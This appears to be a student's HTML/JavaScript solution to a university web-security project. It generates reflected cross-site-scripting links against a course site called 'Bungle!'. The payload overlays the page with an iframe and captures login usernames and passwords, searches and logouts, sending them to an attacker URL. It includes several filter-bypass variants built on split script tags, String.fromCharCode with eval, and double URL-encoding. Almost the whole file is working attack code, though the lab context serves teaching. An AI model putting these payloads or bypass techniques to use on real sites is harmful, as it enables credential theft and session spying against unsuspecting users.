<meta charset="utf-8">
<script src="http://ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
<script>

// Looked at iframe implementation from:
// https://github.com/koto/blog-kotowicz-net-examples/blob/master/track-xss/track.js

function payload(attacker) {
    function log(data) {
        console.log($.param(data));
        $.get(attacker, data);
    }
    function logNav(frameDoc, href){
        var username;
        if(frameDoc.find("#logged-in-user")){
            username = frameDoc.find("#logged-in-user").html();
            log({event: "nav", user: username, url: href });
        } else {
            log({event: "nav", url: href});

        }
    }
    function proxy(href) {
        window.history.replaceState('', "Bungle!","./search");

        var html = $("html").html();
        $("html").html("<iframe id=\"frame1\" style='width:100%; height:100%;position:absolute;top:0;left:0;border:0;'></frame>");
        $("#frame1").attr("src", "http://eecs388.org/project2/");
        $("html").show();
        var firstLoad = true;
        $("#frame1").load(function() {
            var frameDoc = $(this.contentDocument);
            frameDoc.find("a[href *= 'script']").hide();
            if(firstLoad){
                logNav(frameDoc, href);
                firstLoad = false;
            }
            frameDoc.find('#bungle-lnk') // BUNGLE HOME
                .click(function() {
                    logNav(frameDoc, this.target);
                });
            frameDoc.find('.well form')
                .submit(function() {
                    var username = frameDoc.find("#username").val();
                    var password = frameDoc.find("#userpass").val();
                    log({event: "login", user: username, pass: password});
                });
            frameDoc.find('.search-well form')
                .submit(function() {
                    var query = href + "?q=" + frameDoc.find("#query").val();
                    logNav(frameDoc, query);
                    window.history.replaceState('', "Bungle!","./search?q=" + frameDoc.find("#query").val());

                });
            frameDoc.find('#search-again-btn')
                .click(function() {
                    logNav(frameDoc, href);
                    window.history.replaceState('', "Bungle!","./search");
                    
                });
            frameDoc.find('#log-out-btn')
                .click(function() {
                    var username = frameDoc.find("#logged-in-user").html();
                    log({event: "logout", user: username});
                });
        });

    }
    $("html").hide();
    proxy("http://127.0.0.1:31337/");
}




function makeLink(xssdefense, target, attacker) {
    if (xssdefense == 0) {
        return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" +
            encodeURIComponent("<div style=\"display:hidden;\"><script" + ">" + payload.toString() +
            ";payload(\"" + attacker + "\");</script" + "></div>");
    } else if (xssdefense == 1) {
        return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" +
            encodeURIComponent("<div style=\"display:hidden;\"><scrscriptipt" + ">" + payload.toString() +
            ";payload(\"" + attacker + "\");</scrscriptipt" + "></div>");
    } else if (xssdefense == 2) {
        return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" +
            encodeURIComponent("<div style=\"display:hidden;\"><scrscriptipt" + ">" + payload.toString() +
            ";payload(\"" + attacker + "\");</scrscriptipt" + "></div>");
    } else if (xssdefense == 3) {
        // utilizing eval(String.fromCharCode(102, 117, 110 .....)) for this attack to hide punct.

        // compressed with: http://refresh-sf.com/yui/ to make a shorter url
        var compressed = "function payload(a){function d(e){console.log($.param(e));$.get(a,e)}function b(f,e){var g;if(f.find(\"#logged-in-user\")){g=f.find(\"#logged-in-user\").html();d({event:\"nav\",user:g,url:e})}else{d({event:\"nav\",url:e})}}function c(e){window.history.replaceState(\"\",\"Bungle!\",\"./search\");var f=$(\"html\").html();$(\"html\").html('<iframe id=\"frame1\" style=\"width:100%; height:100%;position:absolute;top:0;left:0;border:0;\"></iframe>');$(\"#frame1\").attr(\"src\",\"http://eecs388.org/project2/\");$(\"html\").show();var g=true;$(\"#frame1\").load(function(){var h=$(this.contentDocument);h.find(\"a[href *= 'script']\").hide();if(g){b(h,e);g=false}h.find(\"#bungle-lnk\").click(function(){b(h,this.target)});h.find(\".well form\").submit(function(){var j=h.find(\"#username\").val();var i=h.find(\"#userpass\").val();d({event:\"login\",user:j,pass:i})});h.find(\".search-well form\").submit(function(){var i=e+\"?q=\"+h.find(\"#query\").val();b(h,i);window.history.replaceState(\"\",\"Bungle!\",\"./search?q=\"+h.find(\"#query\").val())});h.find(\"#search-again-btn\").click(function(){b(h,e);window.history.replaceState(\"\",\"Bungle!\",\"./search\")});h.find(\"#log-out-btn\").click(function(){var i=h.find(\"#logged-in-user\").html();d({event:\"logout\",user:i})})})}$(\"html\").hide();c(\"http://127.0.0.1:31337/\")};payload(\"http://127.0.0.1:31337/\");"

        // using the fact that arrays have map function to get charCodeAt for each character
        var chars = Array.prototype.map.call(compressed,  function (s) { return s.charCodeAt(); });

        // format to fit: eval(String.fromCharCode(102, 117, 110 .....))
        var param = 'eval(String.fromCharCode(' + chars.join(',') + '))';

        return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" + encodeURIComponent("<scr" + "ipt>" + param + "</scri" + "pt>");

        // var compressed = "function payload(a){function d(e){console.log($.param(e));$.get(a,e)}function b(f,e){var g;if(f.find(\"#logged-in-user\")){g=f.find(\"#logged-in-user\").html();d({event:\"nav\",user:g,url:e})}else{d({event:\"nav\",url:e})}}function c(e){window.history.replaceState(\"\",\"Bungle!\",\"./search\");var f=$(\"html\").html();$(\"html\").html(\"<iframe id=\"frame1\" style='width:100%; height:100%;position:absolute;top:0;left:0;border:0;'></frame>\");$(\"#frame1\").attr(\"src\",\"http://eecs388.org/project2/\");$(\"html\").show();var g=true;$(\"#frame1\").load(function(){var h=$(this.contentDocument);h.find(\"a[href *= 'script']\").hide();if(g){b(h,e);g=false}h.find(\"#bungle-lnk\").click(function(){b(h,this.target)});h.find(\".well form\").submit(function(){var j=h.find(\"#username\").val();var i=h.find(\"#userpass\").val();d({event:\"login\",user:j,pass:i})});h.find(\".search-well form\").submit(function(){var i=e+\"?q=\"+h.find(\"#query\").val();b(h,i);window.history.replaceState(\"\",\"Bungle!\",\"./search?q=\"+h.find(\"#query\").val())});h.find(\"#search-again-btn\").click(function(){b(h,e);window.history.replaceState(\"\",\"Bungle!\",\"./search\")});h.find(\"#log-out-btn\").click(function(){var i=h.find(\"#logged-in-user\").html();d({event:\"logout\",user:i})})})}$(\"html\").hide();c(\"http://127.0.0.1:31337/\")};payload(\"http://127.0.0.1:31337/\");"

        // got double encoded uri from console also the single quotes weren't being encoded
        // by the encodeURI component so we did those manually
        // console.log(encodeURIComponent(encodeURIComponent(compressed)));\

        // then bypassed the double quotes by shortening a regular expression to get a string

        // var attackScript = "<s" + "cript>var a = /function%2520payload(a)%257Bfunction%2520d(e)%257Bconsole.log(%2524.param(e))%253B%2524.get(a%252Ce)%257Dfunction%2520b(f%252Ce)%257Bvar%2520g%253Bif(f.find(%2522%2523logged-in-user%2522))%257Bg%253Df.find(%2522%2523logged-in-user%2522).html()%253Bd(%257Bevent%253A%2522nav%2522%252Cuser%253Ag%252Curl%253Ae%257D)%257Delse%257Bd(%257Bevent%253A%2522nav%2522%252Curl%253Ae%257D)%257D%257Dfunction%2520c(e)%257Bwindow.history.replaceState(%2522%2522%252C%2522Bungle!%2522%252C%2522.%252Fsearch%2522)%253Bvar%2520f%253D%2524(%2522html%2522).html()%253B%2524(%2522html%2522).html(%2527%253Ciframe%2520id%253D%2522frame1%2522%2520style%253D%2522width%253A100%2525%253B%2520height%253A100%2525%253Bposition%253Aabsolute%253Btop%253A0%253Bleft%253A0%253Bborder%253A0%253B%2522%253E%253C%252Fiframe%253E%2527)%253B%2524(%2522%2523frame1%2522).attr(%2522src%2522%252C%2522http%253A%252F%252Feecs388.org%252Fproject2%252F%2522)%253B%2524(%2522html%2522).show()%253Bvar%2520g%253Dtrue%253B%2524(%2522%2523frame1%2522).load(function()%257Bvar%2520h%253D%2524(this.contentDocument)%253Bh.find(%2522a%255Bhref%2520*%253D%2520%2527script%2527%255D%2522).hide()%253Bif(g)%257Bb(h%252Ce)%253Bg%253Dfalse%257Dh.find(%2522%2523bungle-lnk%2522).click(function()%257Bb(h%252Cthis.target)%257D)%253Bh.find(%2522.well%2520form%2522).submit(function()%257Bvar%2520j%253Dh.find(%2522%2523username%2522).val()%253Bvar%2520i%253Dh.find(%2522%2523userpass%2522).val()%253Bd(%257Bevent%253A%2522login%2522%252Cuser%253Aj%252Cpass%253Ai%257D)%257D)%253Bh.find(%2522.search-well%2520form%2522).submit(function()%257Bvar%2520i%253De%252B%2522%253Fq%253D%2522%252Bh.find(%2522%2523query%2522).val()%253Bb(h%252Ci)%253Bwindow.history.replaceState(%2522%2522%252C%2522Bungle!%2522%252C%2522.%252Fsearch%253Fq%253D%2522%252Bh.find(%2522%2523query%2522).val())%257D)%253Bh.find(%2522%2523search-again-btn%2522).click(function()%257Bb(h%252Ce)%253Bwindow.history.replaceState(%2522%2522%252C%2522Bungle!%2522%252C%2522.%252Fsearch%2522)%257D)%253Bh.find(%2522%2523log-out-btn%2522).click(function()%257Bvar%2520i%253Dh.find(%2522%2523logged-in-user%2522).html()%253Bd(%257Bevent%253A%2522logout%2522%252Cuser%253Ai%257D)%257D)%257D)%257D%2524(%2522html%2522).hide()%253Bc(%2522http%253A%252F%252F127.0.0.1%253A31337%252F%2522)%257D%253Bpayload(%2522http%253A%252F%252F127.0.0.1%253A31337%252F%2522)%253B/.toString(),b=a.substr(1,a.length-2),c=eval(decodeURIComponent(decodeURIComponent(b)))</scr" + "ipt>"


        // return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" + attackScript;



    // var attackScript = "<sc" + "ript language=javascript>eval(String.fromCharCode(102, 117, 110, 99, 116, 105, 111, 110, 32, 112, 97, 121, 108, 111, 97, 100, 40, 97, 41, 123, 102, 117, 110, 99, 116, 105, 111, 110, 32, 100, 40, 101, 41, 123, 99, 111, 110, 115, 111, 108, 101, 46, 108, 111, 103, 40, 36, 46, 112, 97, 114, 97, 109, 40, 101, 41, 41, 59, 36, 46, 103, 101, 116, 40, 97, 44, 101, 41, 125, 102, 117, 110, 99, 116, 105, 111, 110, 32, 98, 40, 102, 44, 101, 41, 123, 118, 97, 114, 32, 103, 59, 105, 102, 40, 102, 46, 102, 105, 110, 100, 40, 92, 34, 35, 108, 111, 103, 103, 101, 100, 45, 105, 110, 45, 117, 115, 101, 114, 92, 34, 41, 41, 123, 103, 61, 102, 46, 102, 105, 110, 100, 40, 92, 34, 35, 108, 111, 103, 103, 101, 100, 45, 105, 110, 45, 117, 115, 101, 114, 92, 34, 41, 46, 104, 116, 109, 108, 40, 41, 59, 100, 40, 123, 101, 118, 101, 110, 116, 58, 92, 34, 110, 97, 118, 92, 34, 44, 117, 115, 101, 114, 58, 103, 44, 117, 114, 108, 58, 101, 125, 41, 125, 101, 108, 115, 101, 123, 100, 40, 123, 101, 118, 101, 110, 116, 58, 92, 34, 110, 97, 118, 92, 34, 44, 117, 114, 108, 58, 101, 125, 41, 125, 125, 102, 117, 110, 99, 116, 105, 111, 110, 32, 99, 40, 101, 41, 123, 119, 105, 110, 100, 111, 119, 46, 104, 105, 115, 116, 111, 114, 121, 46, 114, 101, 112, 108, 97, 99, 101, 83, 116, 97, 116, 101, 40, 92, 34, 92, 34, 44, 92, 34, 66, 117, 110, 103, 108, 101, 33, 92, 34, 44, 92, 34, 46, 47, 115, 101, 97, 114, 99, 104, 92, 34, 41, 59, 118, 97, 114, 32, 102, 61, 36, 40, 92, 34, 104, 116, 109, 108, 92, 34, 41, 46, 104, 116, 109, 108, 40, 41, 59, 36, 40, 92, 34, 104, 116, 109, 108, 92, 34, 41, 46, 104, 116, 109, 108, 40, 92, 34, 60, 105, 102, 114, 97, 109, 101, 32, 105, 100, 61, 92, 34, 102, 114, 97, 109, 101, 49, 92, 34, 32, 115, 116, 121, 108, 101, 61, 39, 119, 105, 100, 116, 104, 58, 49, 48, 48, 37, 59, 32, 104, 101, 105, 103, 104, 116, 58, 49, 48, 48, 37, 59, 112, 111, 115, 105, 116, 105, 111, 110, 58, 97, 98, 115, 111, 108, 117, 116, 101, 59, 116, 111, 112, 58, 48, 59, 108, 101, 102, 116, 58, 48, 59, 98, 111, 114, 100, 101, 114, 58, 48, 59, 39, 62, 60, 47, 102, 114, 97, 109, 101, 62, 92, 34, 41, 59, 36, 40, 92, 34, 35, 102, 114, 97, 109, 101, 49, 92, 34, 41, 46, 97, 116, 116, 114, 40, 92, 34, 115, 114, 99, 92, 34, 44, 92, 34, 104, 116, 116, 112, 58, 47, 47, 101, 101, 99, 115, 51, 56, 56, 46, 111, 114, 103, 47, 112, 114, 111, 106, 101, 99, 116, 50, 47, 92, 34, 41, 59, 36, 40, 92, 34, 104, 116, 109, 108, 92, 34, 41, 46, 115, 104, 111, 119, 40, 41, 59, 118, 97, 114, 32, 103, 61, 116, 114, 117, 101, 59, 36, 40, 92, 34, 35, 102, 114, 97, 109, 101, 49, 92, 34, 41, 46, 108, 111, 97, 100, 40, 102, 117, 110, 99, 116, 105, 111, 110, 40, 41, 123, 118, 97, 114, 32, 104, 61, 36, 40, 116, 104, 105, 115, 46, 99, 111, 110, 116, 101, 110, 116, 68, 111, 99, 117, 109, 101, 110, 116, 41, 59, 104, 46, 102, 105, 110, 100, 40, 92, 34, 97, 91, 104, 114, 101, 102, 32, 42, 61, 32, 39, 115, 99, 114, 105, 112, 116, 39, 93, 92, 34, 41, 46, 104, 105, 100, 101, 40, 41, 59, 105, 102, 40, 103, 41, 123, 98, 40, 104, 44, 101, 41, 59, 103, 61, 102, 97, 108, 115, 101, 125, 104, 46, 102, 105, 110, 100, 40, 92, 34, 35, 98, 117, 110, 103, 108, 101, 45, 108, 110, 107, 92, 34, 41, 46, 99, 108, 105, 99, 107, 40, 102, 117, 110, 99, 116, 105, 111, 110, 40, 41, 123, 98, 40, 104, 44, 116, 104, 105, 115, 46, 116, 97, 114, 103, 101, 116, 41, 125, 41, 59, 104, 46, 102, 105, 110, 100, 40, 92, 34, 46, 119, 101, 108, 108, 32, 102, 111, 114, 109, 92, 34, 41, 46, 115, 117, 98, 109, 105, 116, 40, 102, 117, 110, 99, 116, 105, 111, 110, 40, 41, 123, 118, 97, 114, 32, 106, 61, 104, 46, 102, 105, 110, 100, 40, 92, 34, 35, 117, 115, 101, 114, 110, 97, 109, 101, 92, 34, 41, 46, 118, 97, 108, 40, 41, 59, 118, 97, 114, 32, 105, 61, 104, 46, 102, 105, 110, 100, 40, 92, 34, 35, 117, 115, 101, 114, 112, 97, 115, 115, 92, 34, 41, 46, 118, 97, 108, 40, 41, 59, 100, 40, 123, 101, 118, 101, 110, 116, 58, 92, 34, 108, 111, 103, 105, 110, 92, 34, 44, 117, 115, 101, 114, 58, 106, 44, 112, 97, 115, 115, 58, 105, 125, 41, 125, 41, 59, 104, 46, 102, 105, 110, 100, 40, 92, 34, 46, 115, 101, 97, 114, 99, 104, 45, 119, 101, 108, 108, 32, 102, 111, 114, 109, 92, 34, 41, 46, 115, 117, 98, 109, 105, 116, 40, 102, 117, 110, 99, 116, 105, 111, 110, 40, 41, 123, 118, 97, 114, 32, 105, 61, 101, 43, 92, 34, 63, 113, 61, 92, 34, 43, 104, 46, 102, 105, 110, 100, 40, 92, 34, 35, 113, 117, 101, 114, 121, 92, 34, 41, 46, 118, 97, 108, 40, 41, 59, 98, 40, 104, 44, 105, 41, 59, 119, 105, 110, 100, 111, 119, 46, 104, 105, 115, 116, 111, 114, 121, 46, 114, 101, 112, 108, 97, 99, 101, 83, 116, 97, 116, 101, 40, 92, 34, 92, 34, 44, 92, 34, 66, 117, 110, 103, 108, 101, 33, 92, 34, 44, 92, 34, 46, 47, 115, 101, 97, 114, 99, 104, 63, 113, 61, 92, 34, 43, 104, 46, 102, 105, 110, 100, 40, 92, 34, 35, 113, 117, 101, 114, 121, 92, 34, 41, 46, 118, 97, 108, 40, 41, 41, 125, 41, 59, 104, 46, 102, 105, 110, 100, 40, 92, 34, 35, 115, 101, 97, 114, 99, 104, 45, 97, 103, 97, 105, 110, 45, 98, 116, 110, 92, 34, 41, 46, 99, 108, 105, 99, 107, 40, 102, 117, 110, 99, 116, 105, 111, 110, 40, 41, 123, 98, 40, 104, 44, 101, 41, 59, 119, 105, 110, 100, 111, 119, 46, 104, 105, 115, 116, 111, 114, 121, 46, 114, 101, 112, 108, 97, 99, 101, 83, 116, 97, 116, 101, 40, 92, 34, 92, 34, 44, 92, 34, 66, 117, 110, 103, 108, 101, 33, 92, 34, 44, 92, 34, 46, 47, 115, 101, 97, 114, 99, 104, 92, 34, 41, 125, 41, 59, 104, 46, 102, 105, 110, 100, 40, 92, 34, 35, 108, 111, 103, 45, 111, 117, 116, 45, 98, 116, 110, 92, 34, 41, 46, 99, 108, 105, 99, 107, 40, 102, 117, 110, 99, 116, 105, 111, 110, 40, 41, 123, 118, 97, 114, 32, 105, 61, 104, 46, 102, 105, 110, 100, 40, 92, 34, 35, 108, 111, 103, 103, 101, 100, 45, 105, 110, 45, 117, 115, 101, 114, 92, 34, 41, 46, 104, 116, 109, 108, 40, 41, 59, 100, 40, 123, 101, 118, 101, 110, 116, 58, 92, 34, 108, 111, 103, 111, 117, 116, 92, 34, 44, 117, 115, 101, 114, 58, 105, 125, 41, 125, 41, 125, 41, 125, 36, 40, 92, 34, 104, 116, 109, 108, 92, 34, 41, 46, 104, 105, 100, 101, 40, 41, 59, 99, 40, 92, 34, 104, 116, 116, 112, 58, 47, 47, 49, 50, 55, 46, 48, 46, 48, 46, 49, 58, 51, 49, 51, 51, 55, 47, 92, 34, 41, 125, 59, 112, 97, 121, 108, 111, 97, 100, 40, 92, 34, 104, 116, 116, 112, 58, 47, 47, 49, 50, 55, 46, 48, 46, 48, 46, 49, 58, 51, 49, 51, 51, 55, 47, 92, 34, 41, 59)</sc" + "ript>"

    //     return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" + attackScript;

        // var first = "./search?xssdefense=" + xssdefense.toString() + "&q=";
        // var encode =  ";payload(\"" + attacker + "\");)";
        // encode = encodeURIComponent(encode);
        // var tmp = payload.toString() +
        //     ";payload(\"" + attacker + "\");";
        // alert(encodeURIComponent(tmp));


        // load = encodeURIComponent(payload.toString() + ";payload(\"" + attacker + "\");");

        // var attack = "var a = /function%20payload(attacker)%20%7B%0A%20%20%20%20function%20log(data)%20%7B%0A%20%20%20%20%20%20%20%20console.log(%24.param(data))%3B%0A%20%20%20%20%20%20%20%20%24.get(attacker%2C%20data)%3B%0A%20%20%20%20%7D%0A%20%20%20%20function%20logNav(frameDoc%2C%20href)%7B%0A%20%20%20%20%20%20%20%20var%20username%3B%0A%20%20%20%20%20%20%20%20if(frameDoc.find(%22%23logged-in-user%22))%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20username%20%3D%20frameDoc.find(%22%23logged-in-user%22).html()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20log(%7Bevent%3A%20%22nav%22%2C%20user%3A%20username%2C%20url%3A%20href%20%7D)%3B%0A%20%20%20%20%20%20%20%20%7D%20else%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20log(%7Bevent%3A%20%22nav%22%2C%20url%3A%20href%7D)%3B%0A%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%20%20%20%20function%20proxy(href)%20%7B%0A%20%20%20%20%20%20%20%20window.history.replaceState(''%2C%20%22Bungle!%22%2C%22.%2Fsearch%22)%3B%0A%0A%20%20%20%20%20%20%20%20var%20html%20%3D%20%24(%22html%22).html()%3B%0A%20%20%20%20%20%20%20%20%24(%22html%22).html(%22%3Ciframe%20id%3D%5C%22frame1%5C%22%20style%3D'width%3A100%25%3B%20height%3A100%25%3Bposition%3Aabsolute%3Btop%3A0%3Bleft%3A0%3Bborder%3A0%3B'%3E%3C%2Fframe%3E%22)%3B%0A%20%20%20%20%20%20%20%20%24(%22%23frame1%22).attr(%22src%22%2C%20%22http%3A%2F%2Feecs388.org%2Fproject2%2F%22)%3B%0A%20%20%20%20%20%20%20%20%24(%22html%22).show()%3B%0A%20%20%20%20%20%20%20%20var%20firstLoad%20%3D%20true%3B%0A%20%20%20%20%20%20%20%20%24(%22%23frame1%22).load(function()%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20var%20frameDoc%20%3D%20%24(this.contentDocument)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20frameDoc.find(%22a%5Bhref%20*%3D%20'script'%5D%22).hide()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if(firstLoad)%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20logNav(frameDoc%2C%20href)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20firstLoad%20%3D%20false%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20frameDoc.find('%23bungle-lnk')%20%2F%2F%20BUNGLE%20HOME%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20.click(function()%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20logNav(frameDoc%2C%20this.target)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20frameDoc.find('.well%20form')%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20.submit(function()%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20var%20username%20%3D%20frameDoc.find(%22%23username%22).val()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20var%20password%20%3D%20frameDoc.find(%22%23userpass%22).val()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20log(%7Bevent%3A%20%22login%22%2C%20user%3A%20username%2C%20pass%3A%20password%7D)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20frameDoc.find('.search-well%20form')%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20.submit(function()%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20var%20query%20%3D%20href%20%2B%20%22%3Fq%3D%22%20%2B%20frameDoc.find(%22%23query%22).val()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20logNav(frameDoc%2C%20query)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20window.history.replaceState(''%2C%20%22Bungle!%22%2C%22.%2Fsearch%3Fq%3D%22%20%2B%20frameDoc.find(%22%23query%22).val())%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20frameDoc.find('%23search-again-btn')%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20.click(function()%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20logNav(frameDoc%2C%20href)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20window.history.replaceState(''%2C%20%22Bungle!%22%2C%22.%2Fsearch%22)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20frameDoc.find('%23log-out-btn')%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20.click(function()%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20var%20username%20%3D%20frameDoc.find(%22%23logged-in-user%22).html()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20log(%7Bevent%3A%20%22logout%22%2C%20user%3A%20username%7D)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D)%3B%0A%20%20%20%20%20%20%20%20%7D)%3B%0A%0A%20%20%20%20%7D%0A%20%20%20%20%24(%22html%22).hide()%3B%0A%20%20%20%20proxy(%22http%3A%2F%2F127.0.0.1%3A31337%2F%22)%3B%0A%7D%3Bpayload(%22http%3A%2F%2F127.0.0.1%3A31337%2F%22)%3B/.toString(), b=a.substr(1, a.length - 2), c = eval(decodeURIComponent(b))";



        // encode = encode.replace(/%3B/g, "%3%3BB");
        // encode = encode.replace(/%3B/g, '&#%3B59');
        // encode = encode.replace(/%22/g, '%2%222');
        // encode = encode.replace(/%27/g, '%2%277');
        // encode = encode.replace("%3B","&#0000059");
        // encode = encode.replace(/%22/g,"%2%222");
        // encode = encode.replace(/%27/g, "%2%277");
        // alert(encode);
        //alert(target + first + encode);
        // myEncoded = myStr.substr(1, myStr.length - 2),
        // myEval = decodeURIComponent(myEncoded),
        // foo = eval(myEval);
        // return target + first + "<scri" + "pt>" + attack + "</scri" + "pt>";
    } else if (xssdefense == 11) {
        var first =  target + "./search?xssdefense=" + xssdefense.toString() + "&q=<scr"+ "ipt>foo = eval(decodeURIComponent(";
        var encode = encodeURIComponent(payload.toString() + ";payload(\"" + attacker + "\");");

        encode = encode.replace(/%3B/g, "%3%3BB");

        encode = encode.replace(/%22/g, '%2%222');

        encode = encode.replace(/%27/g, '%2%277');
        return first + encode + "))</scr"+"ipt>";











    } else { //xssdefense == 4 
        return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" +
            encodeURIComponent("<div style=\"display:hidden;\"><script" + ">" + payload.toString() +
            ";payload(\"" + attacker + "\");</script" + "></div>");
    }
}

// return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" +
//             encodeURIComponent("<div style=\"display:hidden;\"><BODY" + " ONLOAD=\"" + payload.toString() + ";payload(\"" + attacker + "\");\"></BODY></div>");

var xssdefense =3;
var target = "http://eecs388.org/project2/";
var attacker = "http://127.0.0.1:31337/";
$(function() {
    var url = makeLink(xssdefense, target, attacker);
    $("h3").html("<a target=\"run\" href=\"" + url + "\">Try Bungle!</a>");
});
</script>
<h3></h3>